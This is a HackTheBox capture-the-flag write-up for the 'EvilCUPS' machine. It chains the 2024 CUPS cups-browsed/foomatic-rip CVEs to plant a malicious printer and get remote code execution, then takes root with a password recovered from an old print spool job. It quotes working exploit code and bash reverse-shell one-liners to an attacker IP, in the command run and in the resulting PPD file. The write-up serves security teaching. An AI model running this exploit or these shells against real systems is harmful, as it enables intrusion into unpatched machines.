---
title: HTB: EvilCUPS
url: https://0xdf.gitlab.io/2024/10/02/htb-evilcups.html
date: 2024-10-02T09:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-evilcups, debian, nmap, cups, cve-2024-47176, cve-2024-47076, cve-2024-47175, cve-2024-47177, print-jobs
---

![EvilCUPS](/img/evilcups-cover.png)

EvilCUPS is all about the recent CUPS exploits that have made a lot of news in September 2024. I’ll abuse the four recent CVEs to get remote code execution on a Linux box through cupsd. In the root step, I’ll find an old print job and recreate the PDF to see it has the root password. In Beyond Root, I’ll look at the PPD file created during the exploit path.

## Box Info

| Name | [EvilCUPS](https://hackthebox.com/machines/evilcups)  [EvilCUPS](https://hackthebox.com/machines/evilcups) [Play on HackTheBox](https://hackthebox.com/machines/evilcups) |
| --- | --- |
| Release Date | 02 Oct 2024 |
| Retire Date | 02 Oct 2024 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [ippsec ippsec](https://app.hackthebox.com/users/3769) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and CUPS (631):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.40
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 11:24 EDT
Nmap scan report for 10.10.11.40
Host is up (0.089s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
631/tcp open  ipp

Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
oxdf@hacky$ nmap -p 22,631 -sCV 10.10.11.40
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 11:24 EDT
Nmap scan report for 10.10.11.40
Host is up (0.088s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 36:49:95:03:8d:b4:4c:6e:a9:25:92:af:3c:9e:06:66 (ECDSA)
|_  256 9f:a4:a9:39:11:20:e0:96:ee:c4:9a:69:28:95:0c:60 (ED25519)
631/tcp open  ipp     CUPS 2.4
|_http-title: Home - CUPS 2.4.2
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.10 seconds

```

Based on the [OpenSSH version](https://packages.debian.org/search?keywords=openssh-server), the host is likely running Debian 12 bookworm.

Seeing CUPS (Common Unix Printing System), I’ll check UDP as well, and it’s likely open:

```

oxdf@hacky$ nmap -sU -p 631 10.10.11.40
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 11:28 EDT
Nmap scan report for 10.10.11.40
Host is up (0.090s latency).

PORT    STATE         SERVICE
631/udp open|filtered ipp

Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds

```

### CUPS - TCP 631

On TCP, CUPS offers a web GUI to manage printers:

![image-20240930113232598](/img/image-20240930113232598.png)

It’s running CUPS version 2.4.2, and the Copyright at the bottom shows 2021-2022.

On the “Printers” tab, there’s one printer installed:

![image-20240930113329149](/img/image-20240930113329149.png)

The page for the printer shows options for administrating it:

![image-20240930113351935](/img/image-20240930113351935.png)

At the bottom, there are no active jobs, but there are some completed ones:

![image-20240930131421780](/img/image-20240930131421780.png)

The page for “Administration” (`/admin`) returns 403 Forbidden:

![image-20240930113428324](/img/image-20240930113428324.png)

## Shell as lp

### CUPS CVEs

On 26 September 2024 (a bit more than a week before EvilCups released), a researcher who goes by evilsocket released [research about vulnerabilities in CUPs](https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/). It includes four CVEs:
- [CVE-2024-47176](https://nvd.nist.gov/vuln/detail/CVE-2024-47176) - `cups-browsed`, the service that typically listens on all interfaces UDP 631, is what allows adding a printer to a machine remotely. This vulnerability allows any attacker who can reach this machine to trigger a “Get-Printer-Attributes” Internet Printing Protocol (IPP) request being sent to an attacker-controlled URL. This was patched by just disabling `cups-browsed` as it’s not really the best way to get this functionality any more.
- [CVE-2024-47076](https://nvd.nist.gov/vuln/detail/CVE-2024-47076) - `libcupsfilters` is responsible for handling the IPP attributes returned from the request. These are written to a temporary Postscript Printer Description (PPD) file without sanitization, allowing malicious attributes to be written.
- [CVE-2024-47175](https://nvd.nist.gov/vuln/detail/CVE-2024-47175) - `libppd` is responsible for reading a temporary PPD file and turning that into a printer object on the system. It also doesn’t sanitize when reading, allowing for injection of attacker controlled data.
- [CVE-2024-47177](https://nvd.nist.gov/vuln/detail/CVE-2024-47177) - This vulnerability in `cups-filters` allows for loading a printer using the `foomatic-rip` print filter, which is a universal converter for transforming PostScript or PDF data into the format that the printer can understand. It has long had issues with command injection, and has been limited to manual installs / configurations only.

Combining these four vulnerabilities, I can add a malicious printer to a system remotely and then when it prints a page, the vulnerability will trigger and run my command.

### Create Evil Printer

#### POC Analysis

The box’s author, IppSec, has a [script to exploit this](https://github.com/ippsec/evil-cups) (built from the POCs that are out there already, but with improved stability). The `__main__` function gives a good overview of what the script does:

```

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("%s <LOCAL_HOST> <TARGET_HOST> <COMMAND>" % sys.argv[0])
        quit()

    SERVER_HOST = sys.argv[1]
    SERVER_PORT = 12345

    command = sys.argv[3]

    server = IPPServer((SERVER_HOST, SERVER_PORT),
                       IPPRequestHandler, MaliciousPrinter(command))

    threading.Thread(
        target=run_server,
        args=(server, )
    ).start()

    TARGET_HOST = sys.argv[2]
    TARGET_PORT = 631
    send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT)

    print("Please wait this normally takes 30 seconds...")

    seconds = 0
    while True:
        print(f"\r{seconds} elapsed", end="", flush=True)
        time.sleep(1)
        seconds += 1

```

It starts an IPP server hosting information about a malicious printer. Then it sends a `browsed` packet to trigger the request, and

The `browse` packet is built off the specification [here](https://opensource.apple.com/source/cups/cups-327/cups/doc/help/spec-browsing.html):

```

def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
    print(f"Sending udp packet to {ip}:{port}...")

    # Get a random number between 0 and 100
    printer_type = 2
    printer_state = '3'
    printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/EVILCUPS'
    printer_location = '"You Have Been Hacked"'
    printer_info = '"HACKED"'
    printer_model = '"HP LaserJet 1020"'
    packet = f"{printer_type:x} {printer_state} {printer_uri} {printer_location} {printer_info} {printer_model} \n"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet.encode('utf-8'), (ip, port))

def run_server(server):
    with ServerContext(server):
        try:
            while True:
                time.sleep(.5)
        except KeyboardInterrupt:
            pass

    server.shutdown()

```

This is sending a UDP packet to the CUPs port to trigger an IPP request back to me.

The `MaliciousPrinter` class is mostly a set of normal attributes except the last one, which is where the injection happens:

```

class MaliciousPrinter(behaviour.StatelessPrinter):
    def __init__(self, command):
        self.command = command
        super(MaliciousPrinter, self).__init__()
    
    def printer_list_attributes(self):
        attr = {
            # rfc2911 section 4.4
            (   
                SectionEnum.printer,
                b'printer-uri-supported',
                TagEnum.uri
            ): [self.printer_uri],
            (
            ...[snip]...
            (
                SectionEnum.printer,
                b'printer-more-info',
                TagEnum.uri
            ): [f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()],
...[snip]...

```

The data starts with a newline, and then adds a `FoomaticRIPCommandLine` with the desired command.

#### Add Printer

Typically I liked to test POCs using simple payloads at first. Given that this POC will create a printer that I can’t delete, I’m going to try to just start with a shell. I’ll run the POC, and it sends the UDP packet:

```

oxdf@hacky$ python evil-cups.py 10.10.14.6 10.10.11.40 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
IPP Server Listening on ('10.10.14.6', 12345)
Sending udp packet to 10.10.11.40:631...
Please wait this normally takes 30 seconds...
2 elapsed 

```

A better shell to send would be `nohup bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"&'`, as this will start the shell as a new process in the background. Otherwise, the shell dies every 5-10 minutes when the printer crashes for not being a real printer and gets cleaned up.

There’s a hang where it says it takes 30 seconds to respond, with a counter. After 29, the target connects and it sends the printer payload:

```

29 elapsed
target connected, sending payload ...

target connected, sending payload ...

```

At this point, the printer shows up on the CUPs TCP webserver:

![image-20240930124153109](/img/image-20240930124153109.png)

### Trigger RCE

From the page for the printer, one of the “Maintenance” options is to “Print Test Page”, which I’ll select:

![image-20240930125217779](/img/image-20240930125217779.png)

As soon as I do, I get a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.40 56432
bash: cannot set terminal process group (1358): Inappropriate ioctl for device
bash: no job control in this shell
lp@evilcups:/$ 

```

I’ll [upgrade my shell](https://www.youtube.com/waDtch?v=qE6DxqJg8Q):

```

lp@evilcups:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
lp@evilcups:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
lp@evilcups:/$

```

I’ll find `user.txt` world-readable in `/home/htb/`:

```

lp@evilcups:/home/htb$ cat user.txt
2a7bfa97************************

```

## Shell as root

### Enumeration

#### Home Directories

There is one user on the box, htb:

```

lp@evilcups:/home$ ls -l
total 4
drwxrwx--- 3 htb lp 4096 Sep 30 13:04 htb

```

Interestingly, lp has full access. There’s nothing useful beyond the flag here.

The same user has a shell set in `passwd`:

```

lp@evilcups:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
htb:x:1000:1000:htb,,,:/home/htb:/bin/bash

```

The lp user’s home directory is `/var/spool/cups/tmp`:

```

lp@evilcups:~$ pwd
/var/spool/cups/tmp

```

It’s very empty:

```

lp@evilcups:~$ ls -la
total 8
drwxrwx--T 2 root lp 4096 Sep 30 13:21 .
drwx--x--- 3 root lp 4096 Sep 30 13:21 ..
-rw------- 1 lp   lp    0 Sep 30 11:50 cups-dbus-notifier-lockfile

```

#### Print Jobs

I noted [above](#cups---tcp-631) that there were three previous print jobs. [This CUPS documentation](https://www.cups.org/doc/spec-design.html) describes the location of “Job Files” as `/var/spool/cups`. Unfortunately, lp can’t list this directory:

```

lp@evilcups:/var/spool$ ls -ld cups
drwx--x--- 3 root lp 4096 Sep 30 13:21 cups

```

However, the [same docs](https://www.cups.org/doc/spec-design.html) show the filename format as `D[5 digit int]-100`. I can see if the file associated with a job is there, and it is:

```

lp@evilcups:/var/spool/cups$ cat d00001-001
%!PS-Adobe-3.0
%%BoundingBox: 18 36 577 806
%%Title: Enscript Output
%%Creator: GNU Enscript 1.6.5.90
%%CreationDate: Sat Sep 28 09:31:01 2024
%%Orientation: Portrait
%%Pages: (atend)
%%DocumentMedia: A4 595 842 0 () ()
%%DocumentNeededResources: (atend)
%%EndComments
%%BeginProlog
%%BeginResource: procset Enscript-Prolog 1.6.5 90
%
% Procedures.
%

/_S {   % save current state
  /_s save def
} def
/_R {   % restore from saved state
  _s restore
} def

/S {    % showpage protecting gstate
  gsave
  showpage
  grestore
} bind def

/MF {   % fontname newfontname -> -     make a new encoded font
  /newfontname exch def
  /fontname exch def

  /fontdict fontname findfont def
  /newfont fontdict maxlength dict def

  fontdict {
    exch
    dup /FID eq {
      % skip FID pair
      pop pop
    } {
      % copy to the new font dictionary
      exch newfont 3 1 roll put
    } ifelse
  } forall

  newfont /FontName newfontname put

  % insert only valid encoding vectors
  encoding_vector length 256 eq {
    newfont /Encoding encoding_vector put
  } if

  newfontname newfont definefont pop
} def

/MF_PS { % fontname newfontname -> -    make a new font preserving its enc
  /newfontname exch def
  /fontname exch def

  /fontdict fontname findfont def
  /newfont fontdict maxlength dict def

  fontdict {
    exch
    dup /FID eq {
      % skip FID pair
      pop pop
    } {
      % copy to the new font dictionary
      exch newfont 3 1 roll put
    } ifelse
  } forall

  newfont /FontName newfontname put

  newfontname newfont definefont pop
} def

/SF { % fontname width height -> -      set a new font
  /height exch def
  /width exch def

  findfont
  [width 0 0 height 0 0] makefont setfont
} def

/SUF { % fontname width height -> -     set a new user font
  /height exch def
  /width exch def

  /F-gs-user-font MF
  /F-gs-user-font width height SF
} def

/SUF_PS { % fontname width height -> -  set a new user font preserving its enc
  /height exch def
  /width exch def

  /F-gs-user-font MF_PS
  /F-gs-user-font width height SF
} def

/M {moveto} bind def
/s {show} bind def

/Box {  % x y w h -> -                  define box path
  /d_h exch def /d_w exch def /d_y exch def /d_x exch def
  d_x d_y  moveto
  d_w 0 rlineto
  0 d_h rlineto
  d_w neg 0 rlineto
  closepath
} def

/bgs {  % x y height blskip gray str -> -       show string with bg color
  /str exch def
  /gray exch def
  /blskip exch def
  /height exch def
  /y exch def
  /x exch def

  gsave
    x y blskip sub str stringwidth pop height Box
    gray setgray
    fill
  grestore
  x y M str s
} def

/bgcs { % x y height blskip red green blue str -> -  show string with bg color
  /str exch def
  /blue exch def
  /green exch def
  /red exch def
  /blskip exch def
  /height exch def
  /y exch def
  /x exch def

  gsave
    x y blskip sub str stringwidth pop height Box
    red green blue setrgbcolor
    fill
  grestore
  x y M str s
} def

% Highlight bars.
/highlight_bars {       % nlines lineheight output_y_margin gray -> -
  gsave
    setgray
    /ymarg exch def
    /lineheight exch def
    /nlines exch def

    % This 2 is just a magic number to sync highlight lines to text.
    0 d_header_y ymarg sub 2 sub translate

    /cw d_output_w cols div def
    /nrows d_output_h ymarg 2 mul sub lineheight div cvi def

    % for each column
    0 1 cols 1 sub {
      cw mul /xp exch def

      % for each rows
      0 1 nrows 1 sub {
        /rn exch def
        rn lineheight mul neg /yp exch def
        rn nlines idiv 2 mod 0 eq {
          % Draw highlight bar.  4 is just a magic indentation.
          xp 4 add yp cw 8 sub lineheight neg Box fill
        } if
      } for
    } for

  grestore
} def

% Line highlight bar.
/line_highlight {       % x y width height gray -> -
  gsave
    /gray exch def
    Box gray setgray fill
  grestore
} def

% Column separator lines.
/column_lines {
  gsave
    .1 setlinewidth
    0 d_footer_h translate
    /cw d_output_w cols div def
    1 1 cols 1 sub {
      cw mul 0 moveto
      0 d_output_h rlineto stroke
    } for
  grestore
} def

% Column borders.
/column_borders {
  gsave
    .1 setlinewidth
    0 d_footer_h moveto
    0 d_output_h rlineto
    d_output_w 0 rlineto
    0 d_output_h neg rlineto
    closepath stroke
  grestore
} def

% Do the actual underlay drawing
/draw_underlay {
  ul_style 0 eq {
    ul_str true charpath stroke
  } {
    ul_str show
  } ifelse
} def

% Underlay
/underlay {     % - -> -
  gsave
    0 d_page_h translate
    d_page_h neg d_page_w atan rotate

    ul_gray setgray
    ul_font setfont
    /dw d_page_h dup mul d_page_w dup mul add sqrt def
    ul_str stringwidth pop dw exch sub 2 div ul_h_ptsize -2 div moveto
    draw_underlay
  grestore
} def

/user_underlay {        % - -> -
  gsave
    ul_x ul_y translate
    ul_angle rotate
    ul_gray setgray
    ul_font setfont
    0 0 ul_h_ptsize 2 div sub moveto
    draw_underlay
  grestore
} def

% Page prefeed
/page_prefeed {         % bool -> -
  statusdict /prefeed known {
    statusdict exch /prefeed exch put
  } {
    pop
  } ifelse
} def

% Wrapped line markers
/wrapped_line_mark {    % x y charwith charheight type -> -
  /type exch def
  /h exch def
  /w exch def
  /y exch def
  /x exch def

  type 2 eq {
    % Black boxes (like TeX does)
    gsave
      0 setlinewidth
      x w 4 div add y M
      0 h rlineto w 2 div 0 rlineto 0 h neg rlineto
      closepath fill
    grestore
  } {
    type 3 eq {
      % Small arrows
      gsave
        .2 setlinewidth
        x w 2 div add y h 2 div add M
        w 4 div 0 rlineto
        x w 4 div add y lineto stroke

        x w 4 div add w 8 div add y h 4 div add M
        x w 4 div add y lineto
        w 4 div h 8 div rlineto stroke
      grestore
    } {
      % do nothing
    } ifelse
  } ifelse
} def

% EPSF import.

/BeginEPSF {
  /b4_Inc_state save def                % Save state for cleanup
  /dict_count countdictstack def        % Count objects on dict stack
  /op_count count 1 sub def             % Count objects on operand stack
  userdict begin
  /showpage { } def
  0 setgray 0 setlinecap
  1 setlinewidth 0 setlinejoin
  10 setmiterlimit [ ] 0 setdash newpath
  /languagelevel where {
    pop languagelevel
    1 ne {
      false setstrokeadjust false setoverprint
    } if
  } if
} bind def

/EndEPSF {
  count op_count sub { pos } repeat     % Clean up stacks
  countdictstack dict_count sub { end } repeat
  b4_Inc_state restore
} bind def

% Check PostScript language level.
/languagelevel where {
  pop /gs_languagelevel languagelevel def
} {
  /gs_languagelevel 1 def
} ifelse
%%EndResource
%%BeginResource: procset Enscript-Encoding-88591 1.6.5 90
/encoding_vector [
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/space          /exclam         /quotedbl       /numbersign
/dollar         /percent        /ampersand      /quoteright
/parenleft      /parenright     /asterisk       /plus
/comma          /hyphen         /period         /slash
/zero           /one            /two            /three
/four           /five           /six            /seven
/eight          /nine           /colon          /semicolon
/less           /equal          /greater        /question
/at             /A              /B              /C
/D              /E              /F              /G
/H              /I              /J              /K
/L              /M              /N              /O
/P              /Q              /R              /S
/T              /U              /V              /W
/X              /Y              /Z              /bracketleft
/backslash      /bracketright   /asciicircum    /underscore
/quoteleft      /a              /b              /c
/d              /e              /f              /g
/h              /i              /j              /k
/l              /m              /n              /o
/p              /q              /r              /s
/t              /u              /v              /w
/x              /y              /z              /braceleft
/bar            /braceright     /tilde          /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/.notdef        /.notdef        /.notdef        /.notdef
/space          /exclamdown     /cent           /sterling
/currency       /yen            /brokenbar      /section
/dieresis       /copyright      /ordfeminine    /guillemotleft
/logicalnot     /hyphen         /registered     /macron
/degree         /plusminus      /twosuperior    /threesuperior
/acute          /mu             /paragraph      /bullet
/cedilla        /onesuperior    /ordmasculine   /guillemotright
/onequarter     /onehalf        /threequarters  /questiondown
/Agrave         /Aacute         /Acircumflex    /Atilde
/Adieresis      /Aring          /AE             /Ccedilla
/Egrave         /Eacute         /Ecircumflex    /Edieresis
/Igrave         /Iacute         /Icircumflex    /Idieresis
/Eth            /Ntilde         /Ograve         /Oacute
/Ocircumflex    /Otilde         /Odieresis      /multiply
/Oslash         /Ugrave         /Uacute         /Ucircumflex
/Udieresis      /Yacute         /Thorn          /germandbls
/agrave         /aacute         /acircumflex    /atilde
/adieresis      /aring          /ae             /ccedilla
/egrave         /eacute         /ecircumflex    /edieresis
/igrave         /iacute         /icircumflex    /idieresis
/eth            /ntilde         /ograve         /oacute
/ocircumflex    /otilde         /odieresis      /divide
/oslash         /ugrave         /uacute         /ucircumflex
/udieresis      /yacute         /thorn          /ydieresis
] def
%%EndResource
%%EndProlog
%%BeginSetup
%%IncludeResource: font Courier-Bold
%%IncludeResource: font Courier
/HFpt_w 10 def
/HFpt_h 10 def
/Courier-Bold /HF-gs-font MF
/HF /HF-gs-font findfont [HFpt_w 0 0 HFpt_h 0 0] makefont def
/Courier /F-gs-font MF
/F-gs-font 10 10 SF
/#copies 1 def
% Pagedevice definitions:
gs_languagelevel 1 gt {
  <<
    /PageSize [595 842]
  >> setpagedevice
} if
%%BeginResource: procset Enscript-Header-simple 1.6.5 90

/do_header {    % print default simple header
  gsave
    d_header_x d_header_y HFpt_h 3 div add translate

    HF setfont
    user_header_p {
      5 0 moveto user_header_left_str show

      d_header_w user_header_center_str stringwidth pop sub 2 div
      0 moveto user_header_center_str show

      d_header_w user_header_right_str stringwidth pop sub 5 sub
      0 moveto user_header_right_str show
    } {
      5 0 moveto fname show
      45 0 rmoveto fmodstr show
      45 0 rmoveto pagenumstr show
    } ifelse

  grestore
} def
%%EndResource
/d_page_w 559 def
/d_page_h 770 def
/d_header_x 0 def
/d_header_y 755 def
/d_header_w 559 def
/d_header_h 15 def
/d_footer_x 0 def
/d_footer_y 0 def
/d_footer_w 559 def
/d_footer_h 0 def
/d_output_w 559 def
/d_output_h 755 def
/cols 1 def
%%EndSetup
%%Page: (1) 1
%%BeginPageSetup
_S
18 36 translate
/pagenum 1 def
/fname (pass.txt) def
/fdir (.) def
/ftail (pass.txt) def
% User defined strings:
/fmodstr (Sat Sep 28 09:30:10 2024) def
/pagenumstr (1) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 742 M
(Br3@k-G!@ss-r00t-evilcups) s
_R
S
%%Trailer
%%Pages: 1
%%DocumentNeededResources: font Courier-Bold Courier
%%EOF

```

### Create PDF

The password is visible in plaintext in the file, but it’s more fun to create a visible image of what was printed. I’ll take that file and save a copy on my host. I’ll use `ps2pdf` to generate a PDF:

```

oxdf@hacky$ ps2pdf d00001-001 d00001-001.pdf

```

And then open the resulting PDF:

![image-20240930132845472](/img/image-20240930132845472.png)

It’s a `pass.txt` file, with a password!

### su

That password works with `su` to get a root shell:

```

lp@evilcups:/var/spool/cups$ su -
Password: 
root@evilcups:~# 

```

And grab `root.txt`:

```

root@evilcups:~# cat root.txt
0cd5ff62************************

```

## Beyond Root

When I create a printer over `cups-browsed` like this, it reached out over IPP to the given URL. The resulting attributes are saved as a `.ppd` file, which is located in `/etc/cups/ppd` named after the printer name:

```

root@evilcups:/etc/cups/ppd# ls
HACKED_10_10_14_6.ppd
root@evilcups:/etc/cups/ppd# cat HACKED_10_10_14_6.ppd
*PPD-Adobe: "4.3"
*APRemoteQueueID: ""
*FormatVersion: "4.3"
*FileVersion: "1.28.17"
*LanguageVersion: English
*LanguageEncoding: ISOLatin1
*PSVersion: "(3010.000) 0"
*LanguageLevel: "3"
*FileSystem: False
*PCFileName: "drvless.ppd"
*Manufacturer: "HP"
*ModelName: "HP 0.00"
*Product: "(HP 0.00)"
*NickName: "HP 0.00, driverless, cups-filters 1.28.17"
*ShortNickName: "HP 0.00"
*DefaultOutputOrder: Normal
*ColorDevice: True
*cupsVersion: 2.4
*cupsSNMPSupplies: False
*cupsLanguages: "en"
*APSupplies: ""
*FoomaticRIPCommandLine: "bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1""
*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"
*cupsFilter2: "application/vnd.cups-pdf application/pdf 200 -"
*% Printer did not supply page size info via IPP, using defaults
*OpenUI *PageSize/Media Size: PickOne
*OrderDependency: 10 AnySetup *PageSize
*DefaultPageSize: Letter
*PageSize Letter/US Letter: "<</PageSize[612 792]>>setpagedevice"
*PageSize Legal/US Legal: "<</PageSize[612 1008]>>setpagedevice"
*PageSize Executive/Executive: "<</PageSize[522 756]>>setpagedevice"
*PageSize Tabloid/Tabloid: "<</PageSize[792 1224]>>setpagedevice"
*PageSize A3/A3: "<</PageSize[842 1191]>>setpagedevice"
*PageSize A4/A4: "<</PageSize[595 842]>>setpagedevice"
*PageSize A5/A5: "<</PageSize[420 595]>>setpagedevice"
*PageSize B5/JIS B5: "<</PageSize[516 729]>>setpagedevice"
*PageSize EnvISOB5/Envelope B5: "<</PageSize[499 709]>>setpagedevice"
*PageSize Env10/Envelope #10 : "<</PageSize[297 684]>>setpagedevice"
*PageSize EnvC5/Envelope C5: "<</PageSize[459 649]>>setpagedevice"
*PageSize EnvDL/Envelope DL: "<</PageSize[312 624]>>setpagedevice"
*PageSize EnvMonarch/Envelope Monarch: "<</PageSize[279 540]>>setpagedevice"
*CloseUI: *PageSize
*OpenUI *PageRegion/Media Size: PickOne
*OrderDependency: 10 AnySetup *PageRegion
*DefaultPageRegion: Letter
*PageRegion Letter/US Letter: "<</PageSize[612 792]>>setpagedevice"
*PageRegion Legal/US Legal: "<</PageSize[612 1008]>>setpagedevice"
*PageRegion Executive/Executive: "<</PageSize[522 756]>>setpagedevice"
*PageRegion Tabloid/Tabloid: "<</PageSize[792 1224]>>setpagedevice"
*PageRegion A3/A3: "<</PageSize[842 1191]>>setpagedevice"
*PageRegion A4/A4: "<</PageSize[595 842]>>setpagedevice"
*PageRegion A5/A5: "<</PageSize[420 595]>>setpagedevice"
*PageRegion B5/JIS B5: "<</PageSize[516 729]>>setpagedevice"
*PageRegion EnvISOB5/Envelope B5: "<</PageSize[499 709]>>setpagedevice"
*PageRegion Env10/Envelope #10 : "<</PageSize[297 684]>>setpagedevice"
*PageRegion EnvC5/Envelope C5: "<</PageSize[459 649]>>setpagedevice"
*PageRegion EnvDL/Envelope DL: "<</PageSize[312 624]>>setpagedevice"
*PageRegion EnvMonarch/Envelope Monarch: "<</PageSize[279 540]>>setpagedevice"
*CloseUI: *PageSize
*DefaultImageableArea: Letter
*ImageableArea Letter/US Letter: "18 12 594 780"
*ImageableArea Legal/US Legal: "18 12 594 996"
*ImageableArea Executive/Executive: "18 12 504 744"
*ImageableArea Tabloid/Tabloid: "18 12 774 1212"
*ImageableArea A3/A3: "18 12 824 1179"
*ImageableArea A4/A4: "18 12 577 830"
*ImageableArea A5/A5: "18 12 402 583"
*ImageableArea B5/JIS B5: "18 12 498 717"
*ImageableArea EnvISOB5/Envelope B5: "18 12 481 697"
*ImageableArea Env10/Envelope #10 : "18 12 279 672"
*ImageableArea EnvC5/Envelope C5: "18 12 441 637"
*ImageableArea EnvDL/Envelope DL: "18 12 294 612"
*ImageableArea EnvMonarch/Envelope Monarch: "18 12 261 528"
*DefaultPaperDimension: Letter
*PaperDimension Letter/US Letter: "612 792"
*PaperDimension Legal/US Legal: "612 1008"
*PaperDimension Executive/Executive: "522 756"
*PaperDimension Tabloid/Tabloid: "792 1224"
*PaperDimension A3/A3: "842 1191"
*PaperDimension A4/A4: "595 842"
*PaperDimension A5/A5: "420 595"
*PaperDimension B5/JIS B5: "516 729"
*PaperDimension EnvISOB5/Envelope B5: "499 709"
*PaperDimension Env10/Envelope #10 : "297 684"
*PaperDimension EnvC5/Envelope C5: "459 649"
*PaperDimension EnvDL/Envelope DL: "312 624"
*PaperDimension EnvMonarch/Envelope Monarch: "279 540"
*OpenUI *ColorModel/Print Color Mode: PickOne
*OrderDependency: 10 AnySetup *ColorModel
*DefaultColorModel: Gray
*ColorModel FastGray/Fast Grayscale: "<</cupsColorSpace 3/cupsBitsPerColor 1/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceGray>>setpagedevice"
*ColorModel Gray/Grayscale: "<</cupsColorSpace 18/cupsBitsPerColor 8/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceGray>>setpagedevice"
*ColorModel RGB/Color: "<</cupsColorSpace 19/cupsBitsPerColor 8/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceRGB>>setpagedevice"
*CloseUI: *ColorModel
*OpenUI *Duplex/2-Sided Printing: PickOne
*OrderDependency: 10 AnySetup *Duplex
*DefaultDuplex: None
*Duplex None/Off: "<</Duplex false>>setpagedevice"
*Duplex DuplexNoTumble/On (Portrait): "<</Duplex true/Tumble false>>setpagedevice"
*Duplex DuplexTumble/On (Landscape): "<</Duplex true/Tumble true>>setpagedevice"
*CloseUI: *Duplex
*DefaultResolution: 300dpi
*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 -"

```

The important line is:

```
*FoomaticRIPCommandLine: "bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1""

```

When it prints, it will run my reverse shell.

Just above it, there’s an empty parameter:

```
*APSupplies: ""
*FoomaticRIPCommandLine: "bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1""

```

That’s likely from the newline injection I mentioned [above](#poc-analysis):

```

                SectionEnum.printer,
                b'printer-more-info',
                TagEnum.uri
            ): [f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()],

```

`printer-more-info` must translate into the `APSupplies` attribute in the `.ppd` file, and then the new line starts the `FoomaticRIPCommandLine`.